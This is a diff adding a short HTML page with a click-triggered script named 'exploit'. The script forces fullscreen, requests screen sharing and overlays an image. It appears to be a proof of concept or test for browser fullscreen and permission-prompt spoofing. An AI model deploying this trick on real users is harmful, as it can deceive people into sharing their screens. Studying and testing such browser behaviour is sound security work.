@@ -1,0 +1,33 @@
+<body>
+</body>
+<script>
+document.addEventListener("click", exploit);
+
+function exploit() {
+  // Request fullscreen mode
+  if (document.documentElement.requestFullscreen) {
+    document.documentElement.requestFullscreen();
+  } else if (document.documentElement.mozRequestFullScreen) { // Firefox support
+    document.documentElement.mozRequestFullScreen();
+  } else if (document.documentElement.webkitRequestFullscreen) { // Safari support
+    document.documentElement.webkitRequestFullscreen();
+  } else if (document.documentElement.msRequestFullscreen) { // IE/Edge support
+    document.documentElement.msRequestFullscreen();
+  }
+
+  // Request screen sharing
+  navigator.mediaDevices.getDisplayMedia({ video: true })
+    .then((stream) => {
+      console.log("Screen sharing started:", stream);
+
+      // Create an image element
+      const img = document.createElement("img");
+      img.style = "position: absolute; left: 0px; top: 0px";
+      img.src = ""; // Intentionally empty
+      document.body.appendChild(img);
+    })
+    .catch((error) => {
+      console.error("Screen sharing failed:", error);
+    });
+}
+</script>
